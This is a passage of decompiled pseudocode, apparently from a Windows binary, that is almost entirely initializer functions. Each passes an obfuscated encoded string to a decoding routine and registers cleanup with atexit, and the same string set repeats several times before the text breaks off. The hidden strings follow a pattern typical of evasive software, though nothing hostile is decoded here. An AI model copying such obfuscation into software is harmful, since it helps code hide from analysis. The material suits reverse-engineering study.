  sub_40A390(&dword_4F94D8, "IRUzLiYzJDBlBywxKDIhECwiMy4yLic5ZRIUEWUSKDM3KDM=", 0x30u);
  return atexit(sub_48A1A0);
}

//----- (004021C0) --------------------------------------------------------
int sub_4021C0()
{
  sub_40A390(&dword_4F9730, "IRUzLiYzJDBlBywxKDJlbT19d2whECwiMy4yLic5ZRIUEWUSKDM3KDM=", 0x38u);
  return atexit(sub_48A200);
}

//----- (004021E0) --------------------------------------------------------
int sub_4021E0()
{
  sub_40A390(&dword_4F96D0, "FiwvDC8oOQ==", 0xCu);
  return atexit(sub_48A260);
}

//----- (00402200) --------------------------------------------------------
int sub_402200()
{
  sub_40A390(&dword_4F93A0, "DRkZFW50b3Q=", 0xCu);
  return atexit(sub_48A2C0);
}

//----- (00402220) --------------------------------------------------------
int sub_402220()
{
  sub_40A390(&dword_4F95F8, "BggZ", 4u);
  return atexit(sub_48A320);
}

//----- (00402240) --------------------------------------------------------
int sub_402240()
{
  sub_40A390(&dword_4F95B0, "JDUsbzA8LDVvIi4w", 0x10u);
  return atexit(sub_48A380);
}

//----- (00402260) --------------------------------------------------------
int sub_402260()
{
  sub_40A390(&dword_4F97C0, "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/", 0x40u);
  return atexit(sub_48A3E0);
}

//----- (00402280) --------------------------------------------------------
int sub_402280()
{
  sub_40A390(&dword_4F9B08, "Eg4HGRYEEwghECwiMy4yLic5IRYsLykuNjIhAjgzMygvORcoMzIsLi8hFS4xLCIsKDIhEjwyOSgw", 0x4Cu);
  return atexit(sub_48A440);
}

//----- (004022A0) --------------------------------------------------------
int sub_4022A0()
{
  sub_40A390(&dword_4F9940, "CC8kIzEoESwvKigpAi4vLygiOSwuLzI=", 0x20u);
  return atexit(sub_48A4A0);
}

//----- (004022C0) --------------------------------------------------------
int sub_4022C0()
{
  sub_40A390(&dword_4F9880, "Ei4nOTYkMyghECwiMy4yLic5IRYsLykuNjIhAjgzMygvORcoMzIsLi8hEzgv", 0x3Cu);
  return atexit(sub_48A500);
}

//----- (004022E0) --------------------------------------------------------
int sub_4022E0()
{
  sub_40A390(&dword_4F9A00, "CC8kIzEoERgE", 0xCu);
  return atexit(sub_48A560);
}

//----- (00402300) --------------------------------------------------------
int sub_402300()
{
  sub_40A390(&dword_4F9B50, "Ai4vMigvORUzLjA1OQMoLSQ3LC4zBCkwLC8=", 0x24u);
  return atexit(sub_48A5C0);
}

//----- (00402320) --------------------------------------------------------
int sub_402320()
{
  sub_40A390(&dword_4F9988, "EhwSGQgQCRMMFwg=", 0x10u);
  return atexit(sub_48A620);
}

//----- (00402340) --------------------------------------------------------
int sub_402340()
{
  sub_40A390(&dword_4F9B38, "FRMOBhMEEAcMEQgSbT19d2w=", 0x18u);
  return atexit(sub_48A680);
}

//----- (00402360) --------------------------------------------------------
int sub_402360()
{
  sub_40A390(&dword_4F99A0, "GBIIExUTDgcMEQg=", 0x10u);
  return atexit(sub_48A6E0);
}

//----- (00402380) --------------------------------------------------------
int sub_402380()
{
  sub_40A390(&dword_4F9BB0, "FTMuJjMkMAkkOSQ=", 0x10u);
  return atexit(sub_48A740);
}

//----- (004023A0) --------------------------------------------------------
int sub_4023A0()
{
  sub_40A390(&dword_4F9AD8, "FTMuJjMkMGUHLDEoMg==", 0x14u);
  return atexit(sub_48A7A0);
}

//----- (004023C0) --------------------------------------------------------
int sub_4023C0()
{
  sub_40A390(&dword_4F9C28, "BBERGBIIExIVEw4HDBEI", 0x14u);
  return atexit(sub_48A800);
}

//----- (004023E0) --------------------------------------------------------
int sub_4023E0()
{
  sub_40A390(&dword_4F9A60, "BDU1CSQ5JA==", 0xCu);
  return atexit(sub_48A860);
}

//----- (00402400) --------------------------------------------------------
int sub_402400()
{
  sub_40A390(&dword_4F99B8, "FRgDEQwC", 8u);
  return atexit(sub_48A8C0);
}

//----- (00402420) --------------------------------------------------------
int sub_402420()
{
  sub_40A390(&dword_4F99D0, "GRAV", 4u);
  return atexit(sub_48A920);
}

//----- (00402440) --------------------------------------------------------
int sub_402440()
{
  sub_40A390(&dword_4F9898, "GS4zZQMzLjYyKDM=", 0x10u);
  return atexit(sub_48A980);
}

//----- (00402460) --------------------------------------------------------
int sub_402460()
{
  sub_40A390(&dword_4F9A18, "FiwvKS42Mg==", 0xCu);
  return atexit(sub_48A9E0);
}

//----- (00402480) --------------------------------------------------------
int sub_402480()
{
  sub_40A390(&dword_4F9A78, "IRYsLykuNjI=", 0xCu);
  return atexit(sub_48AA40);
}

//----- (004024A0) --------------------------------------------------------
int sub_4024A0()
{
  sub_40A390(&dword_4F9AF0, "IRUzLiYzJDBlBywxKDI=", 0x14u);
  return atexit(sub_48AAA0);
}

//----- (004024C0) --------------------------------------------------------
int sub_4024C0()
{
  sub_40A390(&dword_4F9AC0, "IRgyKDMyIQQxMWUYMigzMg==", 0x18u);
  return atexit(sub_48AB00);
}

//----- (004024E0) --------------------------------------------------------
int sub_4024E0()
{
  sub_40A390(&dword_4F9928, "IQQ1NQkkOSQ=", 0xCu);
  return atexit(sub_48AB60);
}

//----- (00402500) --------------------------------------------------------
int sub_402500()
{
  sub_40A390(&dword_4F97F0, "NjAsIm8oPShlEg0ECQ4WAg4VHGVuLy4sLzkoMyQiOSw3KA==", 0x30u);
  return atexit(sub_48ABC0);
}

//----- (00402520) --------------------------------------------------------
int sub_402520()
{
  sub_40A390(&dword_4F9850, "NiMkKTAsL2UJCBEIGQhlEhwSGQgQEhkEGQgDBAIKGBU=", 0x2Cu);
  return atexit(sub_48AC20);
}

//----- (00402540) --------------------------------------------------------
int sub_402540()
{
  sub_40A390(&dword_4F9BF8, "NiMkKTAsL2UJCBEIGQhlEhwSGQgQEhkEGQgDBAIKGBVlcCkoMSg5KA4xKSgyOQ==", 0x40u);
  return atexit(sub_48AC80);
}

//----- (00402560) --------------------------------------------------------
int sub_402560()
{
  sub_40A390(&dword_4F9BE0, "IyIpKCksOW8oPShlbjIoOWU6KSgnJDgxOUBlMygiLjcoMzwoLyQjMSgpZQ8u", 0x3Cu);
  return atexit(sub_48ACE0);
}

//----- (00402580) --------------------------------------------------------
int sub_402580()
{
  sub_40A390(
    &dword_4F9820,
    "IyIpKCksOW8oPShlbjIoOWU6KSgnJDgxOUBlIy4uOTI5JDk4MjUuMSwiPGUsJi8uMygkMTEnJCwxODMoMg==",
    0x54u);
  return atexit(sub_48AD40);
}

//----- (004025A0) --------------------------------------------------------
int sub_4025A0()
{
  sub_40A390(&dword_4F99E8, "NzIyJCkwLC9vKD0oZQkoMSg5KGUSLSQpLjYyZW4EMTFlbhQ4LCg5", 0x34u);
  return atexit(sub_48ADA0);
}

//----- (004025C0) --------------------------------------------------------
int sub_4025C0()
{
  sub_40A390(&dword_4F9808, "CDEoNyQ5LC4vewQpMCwvLDI5MyQ5LjNkLyg2ew==", 0x28u);
  return atexit(sub_48AE00);
}

//----- (004025E0) --------------------------------------------------------
int sub_4025E0()
{
  sub_40A390(&dword_4F9B80, "OnIIeAcCdgd8cHwEeHRweXJ3dnB8dXdycAR0c3VzeXkHAwgCdkA=", 0x34u);
  return atexit(sub_48AE60);
}

//----- (00402600) --------------------------------------------------------
int sub_402600()
{
  sub_40A390(&dword_4F9868, "OncICQl3CXZ5cAJ1dXZweQh2eHADdncEcAh4dnl1fHx4CHN5AkA=", 0x34u);
  return atexit(sub_48AEC0);
}

//----- (00402620) --------------------------------------------------------
int sub_402620()
{
  sub_40A390(&dword_4F98E0, "NS42KDMyLSgxMW8oPSg=", 0x14u);
  return atexit(sub_48AF20);
}

//----- (00402640) --------------------------------------------------------
int sub_402640()
{
  sub_40A390(&dword_4F9910, "cDMoJCkwKG8tOTAx", 0x10u);
  return atexit(sub_48AF80);
}

//----- (00402660) --------------------------------------------------------
int sub_402660()
{
  sub_40A390(&dword_4F98B0, "IyIqJjMpbyMwNQ==", 0x10u);
  return atexit(sub_48AFE0);
}

//----- (00402680) --------------------------------------------------------
int sub_402680()
{
  sub_40A390(&dword_4F9C10, "BDExZTwuODNlJywxKDJlLSQyZSMoKC9lKC8iMzw1OSgpS0sMLzI5MzgiOSwuL2U=", 0x40u);
  return atexit(sub_48B040);
}

//----- (004026A0) --------------------------------------------------------
int sub_4026A0()
{
  sub_40A390(&dword_4F98F8, "DQ4QCAkTDBcI", 0xCu);
  return atexit(sub_48B0A0);
}

//----- (004026C0) --------------------------------------------------------
int sub_4026C0()
{
  sub_40A390(&dword_4F98C8, "DQ4QCBUEGQ0=", 0xCu);
  return atexit(sub_48B100);
}

//----- (004026E0) --------------------------------------------------------
int sub_4026E0()
{
  sub_40A390(&dword_4F97D8, "Ai4vOTMuMWUVJC8oMSEJKDIqOS41", 0x1Cu);
  return atexit(sub_48B160);
}

//----- (00402700) --------------------------------------------------------
int sub_402700()
{
  sub_40A390(&dword_4F9C40, "FiQxMRUkNSgz", 0xCu);
  return atexit(sub_48B1C0);
}

//----- (00402720) --------------------------------------------------------
int sub_402720()
{
  sub_40A390(&dword_4F9AA8, "OjosKUBA", 8u);
  return atexit(sub_48B220);
}

//----- (00402740) --------------------------------------------------------
int sub_402740()
{
  sub_40A390(&dword_4F9B98, "ODUpJDko", 8u);
  return atexit(sub_48B280);
}

//----- (00402760) --------------------------------------------------------
int sub_402760()
{
  sub_40A390(&dword_4F9A30, "OnMEdQh8AnYDcHcDCH1weXJ1d3B8B3ZycHR1eHZ1dXIHd3V4A0A=", 0x34u);
  return atexit(sub_48B2E0);
}

//----- (00402780) --------------------------------------------------------
int sub_402780()
{
  sub_40A390(&dword_4F9B20, "IRUzLiYzJDBlBywxKDIhECwiMy4yLic5IQg9Ii0kLyYoZRIoMzcoMw==", 0x38u);
  return atexit(sub_48B340);
}

//----- (004027A0) --------------------------------------------------------
int sub_4027A0()
{
  sub_40A390(&dword_4F9958, "IRUzLiYzJDBlBywxKDJlbT19d2whECwiMy4yLic5IQg9Ii0kLyYoZRIoMzcoMw==", 0x40u);
  return atexit(sub_48B3A0);
}

//----- (004027C0) --------------------------------------------------------
int sub_4027C0()
{
  sub_40A390(&dword_4F9970, "IRUzLiYzJDBlBywxKDIhECwiMy4yLic5ZRIUEWUSKDM3KDM=", 0x30u);
  return atexit(sub_48B400);
}

//----- (004027E0) --------------------------------------------------------
int sub_4027E0()
{
  sub_40A390(&dword_4F9BC8, "IRUzLiYzJDBlBywxKDJlbT19d2whECwiMy4yLic5ZRIUEWUSKDM3KDM=", 0x38u);
  return atexit(sub_48B460);
}

//----- (00402800) --------------------------------------------------------
int sub_402800()
{
  sub_40A390(&dword_4F9B68, "FiwvDC8oOQ==", 0xCu);
  return atexit(sub_48B4C0);
}

//----- (00402820) --------------------------------------------------------
int sub_402820()
{
  sub_40A390(&dword_4F9838, "DRkZFW50b3Q=", 0xCu);
  return atexit(sub_48B520);
}

//----- (00402840) --------------------------------------------------------
int sub_402840()
{
  sub_40A390(&dword_4F9A90, "BggZ", 4u);
  return atexit(sub_48B580);
}

//----- (00402860) --------------------------------------------------------
int sub_402860()
{
  sub_40A390(&dword_4F9A48, "JDUsbzA8LDVvIi4w", 0x10u);
  return atexit(sub_48B5E0);
}

//----- (00402880) --------------------------------------------------------
int sub_402880()
{
  sub_40A390(&dword_4F9C58, "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/", 0x40u);
  return atexit(sub_48B640);
}

//----- (004028A0) --------------------------------------------------------
int sub_4028A0()
{
  sub_40A390(&dword_4F9FA0, "Eg4HGRYEEwghECwiMy4yLic5IRYsLykuNjIhAjgzMygvORcoMzIsLi8hFS4xLCIsKDIhEjwyOSgw", 0x4Cu);
  return atexit(sub_48B6A0);
}

//----- (004028C0) --------------------------------------------------------
int sub_4028C0()
{
  sub_40A390(&dword_4F9DD8, "CC8kIzEoESwvKigpAi4vLygiOSwuLzI=", 0x20u);
  return atexit(sub_48B700);
}

//----- (004028E0) --------------------------------------------------------
int sub_4028E0()
{
  sub_40A390(&dword_4F9D18, "Ei4nOTYkMyghECwiMy4yLic5IRYsLykuNjIhAjgzMygvORcoMzIsLi8hEzgv", 0x3Cu);
  return atexit(sub_48B760);
}

//----- (00402900) --------------------------------------------------------
int sub_402900()
{
  sub_40A390(&dword_4F9E98, "CC8kIzEoERgE", 0xCu);
  return atexit(sub_48B7C0);
}

//----- (00402920) --------------------------------------------------------
int sub_402920()
{
  sub_40A390(&dword_4F9FE8, "Ai4vMigvORUzLjA1OQMoLSQ3LC4zBCkwLC8=", 0x24u);
  return atexit(sub_48B820);
}

//----- (00402940) --------------------------------------------------------
int sub_402940()
{
  sub_40A390(&dword_4F9E20, "EhwSGQgQCRMMFwg=", 0x10u);
  return atexit(sub_48B880);
}

//----- (00402960) --------------------------------------------------------
int sub_402960()
{
  sub_40A390(&dword_4F9FD0, "FRMOBhMEEAcMEQgSbT19d2w=", 0x18u);
  return atexit(sub_48B8E0);
}

//----- (00402980) --------------------------------------------------------
int sub_402980()
{
  sub_40A390(&dword_4F9E38, "GBIIExUTDgcMEQg=", 0x10u);
  return atexit(sub_48B940);
}

//----- (004029A0) --------------------------------------------------------
int sub_4029A0()
{
  sub_40A390(&dword_4FA048, "FTMuJjMkMAkkOSQ=", 0x10u);
  return atexit(sub_48B9A0);
}

//----- (004029C0) --------------------------------------------------------
int sub_4029C0()
{
  sub_40A390(&dword_4F9F70, "FTMuJjMkMGUHLDEoMg==", 0x14u);
  return atexit(sub_48BA00);
}

//----- (004029E0) --------------------------------------------------------
int sub_4029E0()
{
  sub_40A390(&dword_4FA0C0, "BBERGBIIExIVEw4HDBEI", 0x14u);
  return atexit(sub_48BA60);
}

//----- (00402A00) --------------------------------------------------------
int sub_402A00()
{
  sub_40A390(&dword_4F9EF8, "BDU1CSQ5JA==", 0xCu);
  return atexit(sub_48BAC0);
}

//----- (00402A20) --------------------------------------------------------
int sub_402A20()
{
  sub_40A390(&dword_4F9E50, "FRgDEQwC", 8u);
  return atexit(sub_48BB20);
}

//----- (00402A40) --------------------------------------------------------
int sub_402A40()
{
  sub_40A390(&dword_4F9E68, "GRAV", 4u);
  return atexit(sub_48BB80);
}

//----- (00402A60) --------------------------------------------------------
int sub_402A60()
{
  sub_40A390(&dword_4F9D30, "GS4zZQMzLjYyKDM=", 0x10u);
  return atexit(sub_48BBE0);
}

//----- (00402A80) --------------------------------------------------------
int sub_402A80()
{
  sub_40A390(&dword_4F9EB0, "FiwvKS42Mg==", 0xCu);
  return atexit(sub_48BC40);
}

//----- (00402AA0) --------------------------------------------------------
int sub_402AA0()
{
  sub_40A390(&dword_4F9F10, "IRYsLykuNjI=", 0xCu);
  return atexit(sub_48BCA0);
}

//----- (00402AC0) --------------------------------------------------------
int sub_402AC0()
{
  sub_40A390(&dword_4F9F88, "IRUzLiYzJDBlBywxKDI=", 0x14u);
  return atexit(sub_48BD00);
}

//----- (00402AE0) --------------------------------------------------------
int sub_402AE0()
{
  sub_40A390(&dword_4F9F58, "IRgyKDMyIQQxMWUYMigzMg==", 0x18u);
  return atexit(sub_48BD60);
}

//----- (00402B00) --------------------------------------------------------
int sub_402B00()
{
  sub_40A390(&dword_4F9DC0, "IQQ1NQkkOSQ=", 0xCu);
  return atexit(sub_48BDC0);
}

//----- (00402B20) --------------------------------------------------------
int sub_402B20()
{
  sub_40A390(&dword_4F9C88, "NjAsIm8oPShlEg0ECQ4WAg4VHGVuLy4sLzkoMyQiOSw3KA==", 0x30u);
  return atexit(sub_48BE20);
}

//----- (00402B40) --------------------------------------------------------
int sub_402B40()
{
  sub_40A390(&dword_4F9CE8, "NiMkKTAsL2UJCBEIGQhlEhwSGQgQEhkEGQgDBAIKGBU=", 0x2Cu);
  return atexit(sub_48BE80);
}

//----- (00402B60) --------------------------------------------------------
int sub_402B60()
{
  sub_40A390(&dword_4FA090, "NiMkKTAsL2UJCBEIGQhlEhwSGQgQEhkEGQgDBAIKGBVlcCkoMSg5KA4xKSgyOQ==", 0x40u);
  return atexit(sub_48BEE0);
}

//----- (00402B80) --------------------------------------------------------
int sub_402B80()
{
  sub_40A390(&dword_4FA078, "IyIpKCksOW8oPShlbjIoOWU6KSgnJDgxOUBlMygiLjcoMzwoLyQjMSgpZQ8u", 0x3Cu);
  return atexit(sub_48BF40);
}

//----- (00402BA0) --------------------------------------------------------
int sub_402BA0()
{
  sub_40A390(
    &dword_4F9CB8,
    "IyIpKCksOW8oPShlbjIoOWU6KSgnJDgxOUBlIy4uOTI5JDk4MjUuMSwiPGUsJi8uMygkMTEnJCwxODMoMg==",
    0x54u);
  return atexit(sub_48BFA0);
}

//----- (00402BC0) --------------------------------------------------------
int sub_402BC0()
{
  sub_40A390(&dword_4F9E80, "NzIyJCkwLC9vKD0oZQkoMSg5KGUSLSQpLjYyZW4EMTFlbhQ4LCg5", 0x34u);
  return atexit(sub_48C000);
}

//----- (00402BE0) --------------------------------------------------------
int sub_402BE0()
{
  sub_40A390(&dword_4F9CA0, "CDEoNyQ5LC4vewQpMCwvLDI5MyQ5LjNkLyg2ew==", 0x28u);
  return atexit(sub_48C060);
}

//----- (00402C00) --------------------------------------------------------
int sub_402C00()
{
  sub_40A390(&dword_4FA018, "OnIIeAcCdgd8cHwEeHRweXJ3dnB8dXdycAR0c3VzeXkHAwgCdkA=", 0x34u);
  return atexit(sub_48C0C0);
}

//----- (00402C20) --------------------------------------------------------
int sub_402C20()
{
  sub_40A390(&dword_4F9D00, "OncICQl3CXZ5cAJ1dXZweQh2eHADdncEcAh4dnl1fHx4CHN5AkA=", 0x34u);
  return atexit(sub_48C120);
}

//----- (00402C40) --------------------------------------------------------
int sub_402C40()
{
  sub_40A390(&dword_4F9D78, "NS42KDMyLSgxMW8oPSg=", 0x14u);
  return atexit(sub_48C180);
}

//----- (00402C60) --------------------------------------------------------
int sub_402C60()
{
  sub_40A390(&dword_4F9DA8, "cDMoJCkwKG8tOTAx", 0x10u);
  return atexit(sub_48C1E0);
}

//----- (00402C80) --------------------------------------------------------
int sub_402C80()
{
  sub_40A390(&dword_4F9D48, "IyIqJjMpbyMwNQ==", 0x10u);
  return atexit(sub_48C240);
}

//----- (00402CA0) --------------------------------------------------------
int sub_402CA0()
{
  sub_40A390(&dword_4FA0A8, "BDExZTwuODNlJywxKDJlLSQyZSMoKC9lKC8iMzw1OSgpS0sMLzI5MzgiOSwuL2U=", 0x40u);
  return atexit(sub_48C2A0);
}

//----- (00402CC0) --------------------------------------------------------
int sub_402CC0()
{
  sub_40A390(&dword_4F9D90, "DQ4QCAkTDBcI", 0xCu);
  return atexit(sub_48C300);
}

//----- (00402CE0) --------------------------------------------------------
int sub_402CE0()
{
  sub_40A390(&dword_4F9D60, "DQ4QCBUEGQ0=", 0xCu);
  return atexit(sub_48C360);
}

//----- (00402D00) --------------------------------------------------------
int sub_402D00()
{
  sub_40A390(&dword_4F9C70, "Ai4vOTMuMWUVJC8oMSEJKDIqOS41", 0x1Cu);
  return atexit(sub_48C3C0);
}

//----- (00402D20) --------------------------------------------------------
int sub_402D20()
{
  sub_40A390(&dword_4FA0D8, "FiQxMRUkNSgz", 0xCu);
  return atexit(sub_48C420);
}

//----- (00402D40) --------------------------------------------------------
int sub_402D40()
{
  sub_40A390(&dword_4F9F40, "OjosKUBA", 8u);
  return atexit(sub_48C480);
}

//----- (00402D60) --------------------------------------------------------
int sub_402D60()
{
  sub_40A390(&dword_4FA030, "ODUpJDko", 8u);
  return atexit(sub_48C4E0);
}

//----- (00402D80) --------------------------------------------------------
int sub_402D80()
{
  sub_40A390(&dword_4F9EC8, "OnMEdQh8AnYDcHcDCH1weXJ1d3B8B3ZycHR1eHZ1dXIHd3V4A0A=", 0x34u);
  return atexit(sub_48C540);
}

//----- (00402DA0) --------------------------------------------------------
int sub_402DA0()
{
  sub_40A390(&dword_4F9FB8, "IRUzLiYzJDBlBywxKDIhECwiMy4yLic5IQg9Ii0kLyYoZRIoMzcoMw==", 0x38u);
  return atexit(sub_48C5A0);
}

//----- (00402DC0) --------------------------------------------------------
int sub_402DC0()
{
  sub_40A390(&dword_4F9DF0, "IRUzLiYzJDBlBywxKDJlbT19d2whECwiMy4yLic5IQg9Ii0kLyYoZRIoMzcoMw==", 0x40u);
  return atexit(sub_48C600);
}

//----- (00402DE0) --------------------------------------------------------
int sub_402DE0()
{
  sub_40A390(&dword_4F9E08, "IRUzLiYzJDBlBywxKDIhECwiMy4yLic5ZRIUEWUSKDM3KDM=", 0x30u);
  return atexit(sub_48C660);
}

//----- (00402E00) --------------------------------------------------------
int sub_402E00()
{
  sub_40A390(&dword_4FA060, "IRUzLiYzJDBlBywxKDJlbT19d2whECwiMy4yLic5ZRIUEWUSKDM3KDM=", 0x38u);
  return atexit(sub_48C6C0);
}

//----- (00402E20) --------------------------------------------------------
int sub_402E20()
{
  sub_40A390(&dword_4FA000, "FiwvDC8oOQ==", 0xCu);
  return atexit(sub_48C720);
}

//----- (00402E40) --------------------------------------------------------
int sub_402E40()
{
  sub_40A390(&dword_4F9CD0, "DRkZFW50b3Q=", 0xCu);
  return atexit(sub_48C780);
}

//----- (00402E60) --------------------------------------------------------
int sub_402E60()
{
  sub_40A390(&dword_4F9F28, "BggZ", 4u);
  return atexit(sub_48C7E0);
}

//----- (00402E80) --------------------------------------------------------
int sub_402E80()
{
  sub_40A390(&dword_4F9EE0, "JDUsbzA8LDVvIi4w", 0x10u);
  return atexit(sub_48C840);
}

//----- (00402EA0) --------------------------------------------------------
int sub_402EA0()
{
  sub_40A390(&dword_4FA0F0, "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/", 0x40u);
  return atexit(sub_48C8A0);
}

//----- (00402EC0) --------------------------------------------------------
int sub_402EC0()
{
  sub_40A390(&dword_4FA438, "Eg4HGRYEEwghECwiMy4yLic5IRYsLykuNjIhAjgzMygvORcoMzIsLi8hFS4xLCIsKDIhEjwyOSgw", 0x4Cu);
  return atexit(sub_48C900);
}

//----- (00402EE0) --------------------------------------------------------
int sub_402EE0()
{
  sub_40A390(&dword_4FA270, "CC8kIzEoESwvKigpAi4vLygiOSwuLzI=", 0x20u);
  return atexit(sub_48C960);
}

//----- (00402F00) --------------------------------------------------------
int sub_402F00()
{
  sub_40A390(&dword_4FA1B0, "Ei4nOTYkMyghECwiMy4yLic5IRYsLykuNjIhAjgzMygvORcoMzIsLi8hEzgv", 0x3Cu);
  return atexit(sub_48C9C0);
}

//----- (00402F20) --------------------------------------------------------
int sub_402F20()
{
  sub_40A390(&dword_4FA330, "CC8kIzEoERgE", 0xCu);
  return atexit(sub_48CA20);
}

//----- (00402F40) --------------------------------------------------------
int sub_402F40()
{
  sub_40A390(&dword_4FA480, "Ai4vMigvORUzLjA1OQMoLSQ3LC4zBCkwLC8=", 0x24u);
  return atexit(sub_48CA80);
}

//----- (00402F60) --------------------------------------------------------
int sub_402F60()
{
  sub_40A390(&dword_4FA2B8, "EhwSGQgQCRMMFwg=", 0x10u);
  return atexit(sub_48CAE0);
}

//----- (00402F80) --------------------------------------------------------
int sub_402F80()
{
  sub_40A390(&dword_4FA468, "FRMOBhMEEAcMEQgSbT19d2w=", 0x18u);
  return atexit(sub_48CB40);
}

//----- (00402FA0) --------------------------------------------------------
int sub_402FA0()
{
  sub_40A390(&dword_4FA2D0, "GBIIExUTDgcMEQg=", 0x10u);
  return atexit(sub_48CBA0);
}

//----- (00402FC0) --------------------------------------------------------
int sub_402FC0()
{
  sub_40A390(&dword_4FA4E0, "FTMuJjMkMAkkOSQ=", 0x10u);
  return atexit(sub_48CC00);
}

//----- (00402FE0) --------------------------------------------------------
int sub_402FE0()
{
  sub_40A390(&dword_4FA408, "FTMuJjMkMGUHLDEoMg==", 0x14u);
  return atexit(sub_48CC60);
}

//----- (00403000) --------------------------------------------------------
int sub_403000()
{
  sub_40A390(&dword_4FA558, "BBERGBIIExIVEw4HDBEI", 0x14u);
  return atexit(sub_48CCC0);
}

//----- (00403020) --------------------------------------------------------
int sub_403020()
{
  sub_40A390(&dword_4FA390, "BDU1CSQ5JA==", 0xCu);
  return atexit(sub_48CD20);
}

//----- (00403040) --------------------------------------------------------
int sub_403040()
{
  sub_40A390(&dword_4FA2E8, "FRgDEQwC", 8u);
  return atexit(sub_48CD80);
}

//----- (00403060) --------------------------------------------------------
int sub_403060()
{
  sub_40A390(&dword_4FA300, "GRAV", 4u);
  return atexit(sub_48CDE0);
}

//----- (00403080) --------------------------------------------------------
int sub_403080()
{
  sub_40A390(&dword_4FA1C8, "GS4zZQMzLjYyKDM=", 0x10u);
  return atexit(sub_48CE40);
}

//----- (004030A0) --------------------------------------------------------
int sub_4030A0()
{
  sub_40A390(&dword_4FA348, "FiwvKS42Mg==", 0xCu);
  return atexit(sub_48CEA0);
}

//----- (004030C0) --------------------------------------------------------
int sub_4030C0()
{
  sub_40A390(&dword_4FA3A8, "IRYsLykuNjI=", 0xCu);
  return atexit(sub_48CF00);
}

//----- (004030E0) --------------------------------------------------------
int sub_4030E0()
{
  sub_40A390(&dword_4FA420, "IRUzLiYzJDBlBywxKDI=", 0x14u);
  return atexit(sub_48CF60);
}

//----- (00403100) --------------------------------------------------------
int sub_403100()
{
  sub_40A390(&dword_4FA3F0, "IRgyKDMyIQQxMWUYMigzMg==", 0x18u);
  return atexit(sub_48CFC0);
}

//----- (00403120) --------------------------------------------------------
int sub_403120()
{
  sub_40A390(&dword_4FA258, "IQQ1NQkkOSQ=", 0xCu);
  return atexit(sub_48D020);
}

//----- (00403140) --------------------------------------------------------
int sub_403140()
{
  sub_40A390(&dword_4FA120, "NjAsIm8oPShlEg0ECQ4WAg4VHGVuLy4sLzkoMyQiOSw3KA==", 0x30u);
  return atexit(sub_48D080);
}

//----- (00403160) --------------------------------------------------------
int sub_403160()
{
  sub_40A390(&dword_4FA180, "NiMkKTAsL2UJCBEIGQhlEhwSGQgQEhkEGQgDBAIKGBU=", 0x2Cu);
  return atexit(sub_48D0E0);
}

//----- (00403180) --------------------------------------------------------
int sub_403180()
{
  sub_40A390(&dword_4FA528, "NiMkKTAsL2UJCBEIGQhlEhwSGQgQEhkEGQgDBAIKGBVlcCkoMSg5KA4xKSgyOQ==", 0x40u);
  return atexit(sub_48D140);
}

//----- (004031A0) --------------------------------------------------------
int sub_4031A0()
{
  sub_40A390(&dword_4FA510, "IyIpKCksOW8oPShlbjIoOWU6KSgnJDgxOUBlMygiLjcoMzwoLyQjMSgpZQ8u", 0x3Cu);
  return atexit(sub_48D1A0);
}

//----- (004031C0) --------------------------------------------------------
int sub_4031C0()
{
  sub_40A390(
    &dword_4FA150,
    "IyIpKCksOW8oPShlbjIoOWU6KSgnJDgxOUBlIy4uOTI5JDk4MjUuMSwiPGUsJi8uMygkMTEnJCwxODMoMg==",
    0x54u);
  return atexit(sub_48D200);
}

//----- (004031E0) --------------------------------------------------------
int sub_4031E0()
{
  sub_40A390(&dword_4FA318, "NzIyJCkwLC9vKD0oZQkoMSg5KGUSLSQpLjYyZW4EMTFlbhQ4LCg5", 0x34u);
  return atexit(sub_48D260);
}

//----- (00403200) --------------------------------------------------------
int sub_403200()
{
  sub_40A390(&dword_4FA138, "CDEoNyQ5LC4vewQpMCwvLDI5MyQ5LjNkLyg2ew==", 0x28u);
  return atexit(sub_48D2C0);
}

//----- (00403220) --------------------------------------------------------
int sub_403220()
{
  sub_40A390(&dword_4FA4B0, "OnIIeAcCdgd8cHwEeHRweXJ3dnB8dXdycAR0c3VzeXkHAwgCdkA=", 0x34u);
  return atexit(sub_48D320);
}

//----- (00403240) --------------------------------------------------------
int sub_403240()
{
  sub_40A390(&dword_4FA198, "OncICQl3CXZ5cAJ1dXZweQh2eHADdncEcAh4dnl1fHx4CHN5AkA=", 0x34u);
  return atexit(sub_48D380);
}

//----- (00403260) --------------------------------------------------------
int sub_403260()
{
  sub_40A390(&dword_4FA210, "NS42KDMyLSgxMW8oPSg=", 0x14u);
  return atexit(sub_48D3E0);
}

//----- (00403280) --------------------------------------------------------
int sub_403280()
{
  sub_40A390(&dword_4FA240, "cDMoJCkwKG8tOTAx", 0x10u);
  return atexit(sub_48D440);
}

//----- (004032A0) --------------------------------------------------------
int sub_4032A0()
{
  sub_40A390(&dword_4FA1E0, "IyIqJjMpbyMwNQ==", 0x10u);
  return atexit(sub_48D4A0);
}

//----- (004032C0) --------------------------------------------------------
int sub_4032C0()
{
  sub_40A390(&dword_4FA540, "BDExZTwuODNlJywxKDJlLSQyZSMoKC9lKC8iMzw1OSgpS0sMLzI5MzgiOSwuL2U=", 0x40u);
  return atexit(sub_48D500);
}

//----- (004032E0) --------------------------------------------------------
int sub_4032E0()
{
  sub_40A390(&dword_4FA228, "DQ4QCAkTDBcI", 0xCu);
  return atexit(sub_48D560);
}

//----- (00403300) --------------------------------------------------------
int sub_403300()
{
  sub_40A390(&dword_4FA1F8, "DQ4QCBUEGQ0=", 0xCu);
  return atexit(sub_48D5C0);
}

//----- (00403320) --------------------------------------------------------
int sub_403320()
{
  sub_40A390(&dword_4FA108, "Ai4vOTMuMWUVJC8oMSEJKDIqOS41", 0x1Cu);
  return atexit(sub_48D620);
}

//----- (00403340) --------------------------------------------------------
int sub_403340()
{
  sub_40A390(&dword_4FA570, "FiQxMRUkNSgz", 0xCu);
  return atexit(sub_48D680);
}

//----- (00403360) --------------------------------------------------------
int sub_403360()
{
  sub_40A390(&dword_4FA3D8, "OjosKUBA", 8u);
  return atexit(sub_48D6E0);
}

//----- (00403380) --------------------------------------------------------
int sub_403380()
{
  sub_40A390(&dword_4FA4C8, "ODUpJDko", 8u);
  return atexit(sub_48D740);
}

//----- (004033A0) --------------------------------------------------------
int sub_4033A0()
{
